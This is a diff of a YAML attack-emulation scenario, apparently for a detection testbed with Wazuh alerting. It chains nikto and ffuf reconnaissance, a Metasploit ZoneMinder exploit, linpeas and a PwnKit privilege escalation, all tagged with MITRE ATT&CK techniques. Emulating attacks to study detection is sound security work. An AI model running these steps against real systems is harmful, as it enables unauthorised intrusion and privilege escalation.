@@ -1,13 +1,13 @@
 ####################
 #
-# Scenario 1 b a
+# Scenario 1 b c
 #
 ####################
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: video.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
-  $DOMAIN: aecid-testbed.com
+  $DOMAIN: attackbed.com
   $USER: aecid
   $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   $SSH_KEY: {{sshkey.public_key}}
@@ -28,7 +28,7 @@ commands:
     metadata:
       techniques: "T1595,T1592.002"
       tactics: "Reconnaissance"
-      technique_name: "Active Scanning,Gather Victim Host Information: Software
+      technique_name: "Active Scanning,Gather Victim Host Information: Software"
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
@@ -37,12 +37,20 @@ commands:
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Vulnerability Scanning"
 
+  # wazuh alerts arrive with delay of up to 15 seconds, therefore wait some time
+  - type: sleep
+    seconds: 30
+
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
     metadata:
       techniques: "T1595.003"
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Wordlist Scanning"
+
+  # additional access logs will be produced for around 60 seconds after finishing ffuf, therefore wait some time
+  - type: sleep
+    seconds: 90
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -61,10 +69,6 @@ commands:
     stdapi: True
     session: "foothold"
     cmd: cd /tmp
-    metadata:
-      techniques: "T1105"
-      tactics: "Command and Control"
-      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -137,7 +141,7 @@ commands:
 
   # wait a little bit for linpeas
   - type: sleep
-    seconds: 380
+    seconds: 600
 
   # This command fixes the outputbuffer
   # so that the output of the further
@@ -208,16 +212,6 @@ commands:
     cmd: exit
     session: "foothold"
     end_str: "PWN >"
-
-
-  - type: msf-session
-    cmd: rm ./PwnKit
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1070.004"
-      tactics: "Defense Evasion"
-      technique_name: "Indicator Removal: File Deletion"
 
   - type: msf-session
     cmd: rm linpeas.sh
@@ -310,3 +304,6 @@ commands:
       #  - type: msf-session
       #    cmd: ls -l /root
       #
+
+  - type: sleep
+    seconds: 30
